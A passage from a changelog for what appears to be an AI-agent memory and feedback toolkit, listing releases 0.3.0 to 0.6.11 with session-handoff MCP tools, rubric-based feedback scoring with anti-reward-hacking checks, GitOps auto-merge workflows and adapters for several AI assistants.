- Added `session_handoff` and `session_primer` MCP tools for seamless cross-session context continuity.
- New `session` namespace in ContextFS stores primer.json with auto-captured git state (branch, last 5 commits, modified files, working tree status), last completed task, next step, and blockers.
- `session_handoff` records provenance events for full audit trail of session transitions.
- Closes Layer 2 (primer.md) of the 5-layer memory stack — no manual primer file needed.

## 0.6.11 - 2026-03-10

- Added Inverse Sink Weighting and Anchor-Memory management to prevent runaway negative memory accumulation and stabilize agent behavior over long sessions.
- Hardened MCP startup reliability: retry logic, process health checks, and graceful degradation on server init failures.
- North Star Phase 1: KTO export pipeline, MCP install workflow, and FDD (Feedback-Driven Development) rebrand replacing prior loop branding.
- System hygiene: documented session directives in CLAUDE.md and fixed environment-dependent billing test failures causing flaky CI.
- A2UI model for dynamic agent-to-user interaction: agents can now emit structured UI events that surface inline prompts, confirmation dialogs, and progress updates.
- ADK memory consolidator with Gemini integration: deduplicates and ranks cross-session memories using Gemini embeddings for relevance scoring.
- OpenDev patterns: adaptive context compaction (auto-prune low-signal context items), event-driven reminder injection (surface forgotten constraints mid-session), and model role router (dispatch sub-tasks to appropriately-sized models based on complexity).

## 0.5.0 - 2026-03-03

- Added autonomous GitOps workflows: agent auto-merge, Dependabot auto-merge, self-healing monitor, and merge-branch fallback.
- Enabled CI proof artifact uploads and strengthened CI concurrency/branch scoping.
- Added self-healing command layer (`scripts/self-healing-check.js`, `scripts/self-heal.js`) with unit tests.
- Added semantic cache for ContextFS context-pack construction with TTL + similarity gating and provenance events.
- Added secret-sync helper (`scripts/sync-gh-secrets-from-env.sh`) and docs for required repo settings/secrets.

## 0.4.0 - 2026-03-03

- Added rubric-based feedback scoring with configurable criteria and weighted evaluation.
- Added anti-reward-hacking safeguards: guardrail checks and multi-judge disagreement detection.
- Added rubric-aware memory promotion gates for positive feedback.
- Added rubric-aware context evaluation, prevention-rule dimensions, and DPO export metadata.
- Extended API/MCP/Gemini contracts for rubric scores and guardrails.
- Added automated proof harness for rubric + intent + API/MCP end-to-end validation (`proof/automation/*`).

## 0.3.0 - 2026-03-03

- Added production API server with secure auth defaults and safe-path checks.
- Added local MCP server for Claude/Codex integrations.
- Added ChatGPT, Gemini, Codex, Claude, and Amp adapter bundles.
- Added budget guard and PaperBanana generation workflow.
- Added platform research, packaging plan, and verification artifacts.
